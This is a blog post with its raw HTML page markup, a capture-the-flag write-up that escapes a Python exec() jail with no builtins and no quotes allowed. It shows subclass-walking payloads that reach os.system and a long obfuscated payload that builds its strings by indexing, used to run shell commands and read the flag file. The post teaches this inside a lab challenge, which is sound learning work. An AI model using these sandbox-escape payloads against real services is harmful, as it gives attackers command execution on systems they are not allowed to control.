<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="layout-lang" content="en"><meta name="day-prompt" content="d ago"><meta name="hour-prompt" content="hr ago"><meta name="minute-prompt" content="min ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="Build Yourself In" /><meta name="author" content="David Wolfe" /><meta property="og:locale" content="en" /><meta name="description" content="Description: The extraterrestrials have upgraded their authentication system and now only they are able to pass. Did you manage to learn their language well enough in order to bypass the authorization check?" /><meta property="og:description" content="Description: The extraterrestrials have upgraded their authentication system and now only they are able to pass. Did you manage to learn their language well enough in order to bypass the authorization check?" /><link rel="canonical" href="/posts/Build_Yourself_In/" /><meta property="og:url" content="/posts/Build_Yourself_In/" /><meta property="og:site_name" content="David Wolfe" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-28T12:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Build Yourself In" /><meta name="twitter:site" content="@1c3_B3ar" /><meta name="twitter:creator" content="@David Wolfe" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"David Wolfe"},"dateModified":"2021-08-17T16:07:40-05:00","datePublished":"2021-04-28T12:00:00-05:00","description":"Description: The extraterrestrials have upgraded their authentication system and now only they are able to pass. Did you manage to learn their language well enough in order to bypass the authorization check?","headline":"Build Yourself In","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/Build_Yourself_In/"},"url":"/posts/Build_Yourself_In/"}</script><title>Build Yourself In | David Wolfe</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="David Wolfe"><meta name="application-name" content="David Wolfe"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/profilepic.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">David Wolfe</a></div><div id="typing" class="site-subtitle font-italic"></div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/3D-Art/" class="nav-link"> <i class="fa-fw fas fa-cubes ml-xl-3 mr-xl-3 unloaded"></i> <span>3D-ART</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-wave-square ml-xl-3 mr-xl-3 unloaded"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tools/" class="nav-link"> <i class="fa-fw fas fa-tools ml-xl-3 mr-xl-3 unloaded"></i> <span>TOOLS</span> </a><li class="nav-item"> <a href="/work/" class="nav-link"> <i class="fa-fw fas fa-briefcase ml-xl-3 mr-xl-3 unloaded"></i> <span>WORK</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/dwolfe884" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/1c3_B3ar" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['david','wolfe-works.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><script> var texts = ["Offensive Security Professional", "Technical Communicator", "Security Researcher","Aspiring Educator","3D Artist?"]; var wordOffset = 0; function addLetter(mytext, i){ var typetext = document.getElementById("typing"); if(mytext.charAt(i) == " "){ typetext.innerText = typetext.innerText + " " + mytext.charAt(i+1); } else{ typetext.innerText = typetext.innerText + mytext.charAt(i); } } function delLetter(mytext, i){ var typetext = document.getElementById("typing"); typetext.innerText = typetext.innerText.slice(0,typetext.innerText.length-i); } function delWord(){ console.log("deleting word"); var intr2 = setInterval(() => { var typetext = document.getElementById("typing"); index = 1; delLetter(texts[0],index); index++; if(typetext.innerText.length == 0){ clearInterval(intr2); wordOffset++; if(wordOffset >= texts.length){ wordOffset = 0; } addWord(wordOffset); } },50 ) } function addWord(wordOffset){ var index = 0; var intr = setInterval(() => { addLetter(texts[wordOffset],index); if(texts[wordOffset].charAt(index) == " "){ index = index + 2; } else{ index++; } if(index >= texts[wordOffset].length){ setTimeout(delWord,1000); clearInterval(intr); } },100); } addWord(wordOffset); </script><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Build Yourself In</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Build Yourself In</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> David Wolfe </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Apr 28, 2021, 12:00 PM -0500" >Apr 28, 2021<i class="unloaded">2021-04-28T12:00:00-05:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Aug 17, 2021, 4:07 PM -0500" >Aug 17, 2021<i class="unloaded">2021-08-17T16:07:40-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1098 words">6 min read</span></div></div><div class="post-content"><h2 id="description">Description:</h2><p>The extraterrestrials have upgraded their authentication system and now only they are able to pass. Did you manage to learn their language well enough in order to bypass the authorization check?</p><h2 id="methodology">Methodology</h2><p>This challenge has us placed in a python jail where we can provide very limited input. Providing malformed input can get us a useful error message that gives us a little insight into what exactly this jail is doing.</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">File</span> <span class="sh">"</span><span class="s">/app/build_yourself_in.py</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">13</span><span class="p">,</span> <span class="ow">in</span> <span class="n">main</span>
    <span class="nf">exec</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span> <span class="sh">'</span><span class="s">print</span><span class="sh">'</span><span class="p">:</span><span class="k">print</span><span class="p">})</span>
</pre></table></code></div></div><p>This tells us that our input code is running inside of a locked down exec() call. With <strong>__builtins__</strong> being set to a None object we know that the only function we have available to us is print. However, we can find another restriction in the fact that if we try to run <strong>print(‚Äútest‚Äù)</strong> we get this message.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>üõëNo quotes are allowed! üõë

Exiting..
</pre></table></code></div></div><p>This is an important restriction to know about and one we will come back to later. For now the goal is to run some functions that have supposedly been removed from our environment with <code class="language-plaintext highlighter-rouge">'__builtins__': None</code>. One thing we do have access to inside of this prompt is the use of tuples. Tuples are simple objects in python that are essentially immutable lists. An empty tuple can be created as <code class="language-plaintext highlighter-rouge">()</code> in python. This may not seem very helpful on it‚Äôs own, but what‚Äôs important about tuples in python is that they inherit from the <strong>Object</strong> class. using the python built-in attribute <strong>class</strong> and <strong>bases</strong> we‚Äôre able to return a tuple containing the classes that an object inherits from.</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">print</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">)</span>
<span class="c1">#Results in &lt;class 'object'&gt;
</span></pre></table></code></div></div><p>This is really good news for us as it means we can now access any of the other classes that are used in this program that also inherit from object. We can get a nice list of these different classes by running <code class="language-plaintext highlighter-rouge">().__class__.__bases__[0].__subclasses__()</code> which returns an array containing all of the subclasses of objects that have been imported into this program. I cleaned up the output and got the following list</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre><span class="k">class</span> <span class="err">'</span><span class="nc">type</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">weakref</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">weakcallableproxy</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">weakproxy</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">int</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">bytearray</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">bytes</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">list</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">NoneType</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">NotImplementedType</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">traceback</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">super</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">range</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">dict</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">dict_keys</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">dict_values</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">dict_items</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">dict_reversekeyiterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">dict_reversevalueiterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">dict_reverseitemiterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">odict_iterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">set</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">str</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">slice</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">staticmethod</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">complex</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">float</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">frozenset</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">property</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">managedbuffer</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">memoryview</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">tuple</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">enumerate</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="nb">reversed</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">stderrprinter</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">code</span><span class="sh">'</span><span class="s"> [35]
class </span><span class="sh">'</span><span class="n">frame</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">builtin_function_or_method</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">method</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">function</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">mappingproxy</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">generator</span><span class="sh">'</span><span class="s">
</span><span class="gp">
...</span>
<span class="k">class</span> <span class="err">'</span><span class="nc">bytes_iterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">bytearray_iterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">dict_keyiterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">dict_valueiterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">list_iterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">list_reverseiterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">range_iterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">set_iterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">str_iterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">tuple_iterator</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">collections</span><span class="p">.</span><span class="n">abc</span><span class="p">.</span><span class="n">Sized</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">collections</span><span class="p">.</span><span class="n">abc</span><span class="p">.</span><span class="n">Container</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">collections</span><span class="p">.</span><span class="n">abc</span><span class="p">.</span><span class="n">Callable</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">os</span><span class="p">.</span><span class="n">_wrap_close</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">_sitebuiltins</span><span class="p">.</span><span class="n">Quitter</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">_sitebuiltins</span><span class="p">.</span><span class="n">_Printer</span><span class="sh">'</span><span class="s">
class </span><span class="sh">'</span><span class="n">_sitebuiltins</span><span class="p">.</span><span class="n">_Helper</span><span class="sh">'</span><span class="s">
</span></pre></table></code></div></div><p>This is an incredibly long list, but out of it there are a couple important classes for what we‚Äôre trying to accomplish.</p><p><code class="language-plaintext highlighter-rouge">class 'str'</code> is at position 21 in the array and could be used to build a string without us inputting quotes.</p><p><code class="language-plaintext highlighter-rouge">class 'os._wrap_close'</code> is at position 132 and could be used to access the os.system() function for running commands on the server. We will start tinkering with the os._wrap_close class first. Doing some googling I came across this <a href="https://blog.p6.is/Python-SSTI-exploitable-classes/">article</a> discussing vulnerable python classes.</p><p>At the bottom of the article they provide sample code to access system(‚Äúls‚Äù) from os.__wrap_close</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">[].</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">127</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">](</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="p">)</span>
</pre></table></code></div></div><p>This shows that if you have the os._wrap_close class you can walk up the reference using <code class="language-plaintext highlighter-rouge">__init__.__globals__</code> to get a dictionary of all the functions that class implements.</p><p>We can combine this with our previous command to get a long list of all functions we have access to through the OS.</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">print</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">)</span>
</pre></table></code></div></div><p>This outputs</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>{'__name__': 'os', '__doc__': "OS routines for NT or Posix depending on what system we're on.\n\nThis exports:\n  - all functions from posix or nt, e.g. unlink, stat, etc.\n  - os.path is either posixpath or ntpath\n  - os.name is either 'posix' or 'nt'\n  - os.curdir is a string representing the current directory (always '.')\n  - os.pardir is a string representing the parent directory (always '..')\n  - os.sep is the (or a most common) pathname separator ('/' or '\\\\')\n  - os.extsep is the extension separator (always '.')\n  - os.altsep is the alternate pathname separator (None or '/')\n  - os.pathsep is the component separator used in $PATH etc\n  - os.linesep is the line separator in text files ('\\r' or '\\n' or '\\r\\n')\n  - os.defpath is the default search path for executables\n  - os.devnull is the file path of the null device ('/dev/null', etc.)\n\nPrograms that import and use 'os' stand a better chance of being\nportable between different platforms.  Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir),
...
'system': &lt;built-in function system&gt;
...
</pre></table></code></div></div><p>In the middle of this incredibly long output we find the entry for <strong>system</strong>. Perfect, we‚Äôre almost there!</p><p>Now we have TO the address the elephant in the room‚Ä¶ we still can‚Äôt use quotes of any kind to build a string.<br /> The original code we want to run is <code class="language-plaintext highlighter-rouge">print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['system']('ls'))</code>. We can do all of this except for the <strong>system</strong> and <strong>ls</strong> strings.<br /> To get around this we need to go back to the str class we found previously in the class dump. The useful aspect of this function comes from the fact that if you give it a dictionary or array, it will return the string version of that object. In python string objects can be substringed with indices the same way you would an array.</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">print</span><span class="p">(</span><span class="nf">str</span><span class="p">({</span><span class="sh">'</span><span class="s">__name__</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">})[</span><span class="mi">4</span><span class="p">])</span> <span class="c1">#This results the letter n being printed
</span></pre></table></code></div></div><p>With this in mind we just need to pass in an object that has all the characters we need to build the string for <strong>system</strong> and <strong>ls</strong>. I decided to pass in the large function dump we got from running the above <code class="language-plaintext highlighter-rouge">__init__.__globals__</code> code. With this long string for our use in substringing we are now able to piece together the strings we need. I wrote a small <a href="https://github.com/dwolfe884/CTFWriteups/blob/main/misc/HTBCTF_BuildYourselfIn/builder.py">script</a> to build the payload for me.</p><p>The final payload I ended up using to cat out the flag.txt file was</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">print</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">22</span><span class="p">](().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">)[</span><span class="mi">79</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">22</span><span class="p">](().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">)[</span><span class="mi">78</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">22</span><span class="p">](().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">)[</span><span class="mi">79</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">22</span><span class="p">](().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">)[</span><span class="mi">80</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">22</span><span class="p">](().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">)[</span><span class="mi">81</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">22</span><span class="p">](().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">)[</span><span class="mi">82</span><span class="p">]](().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">22</span><span class="p">](().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">)[</span><span class="mi">155</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">22</span><span class="p">](().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">)[</span><span class="mi">79</span><span class="p">]))</span>
</pre></table></code></div></div><p>This returns our flag</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CHTB{n0_j4il_c4n_h4ndl3_m3!}
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>Writeups</a>, <a href='/categories/htbctf/'>HTBCTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/htbctf/" class="post-tag no-text-decoration" >htbctf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Build Yourself In - David Wolfe&url=/posts/Build_Yourself_In/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Build Yourself In - David Wolfe&u=/posts/Build_Yourself_In/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Build Yourself In - David Wolfe&url=/posts/Build_Yourself_In/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Mandiant_Work/">Mandiant Internship</a><li><a href="/posts/x86-Flow-Graph-Obsidian/">x86 Flow Graph Plugin for Obsidian</a><li><a href="/posts/Sp00kyCTF_2022/">Sp00kyCTF 2022 Reflection</a><li><a href="/posts/Senior_Design/">Senior Design</a><li><a href="/posts/CprE381_Processor/">CprE 381 Processor Design</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/3dart/">3dart</a> <a class="post-tag" href="/tags/blender/">blender</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/isu/">ISU</a> <a class="post-tag" href="/tags/portfolio/">portfolio</a> <a class="post-tag" href="/tags/project/">project</a> <a class="post-tag" href="/tags/ractf/">ractf</a> <a class="post-tag" 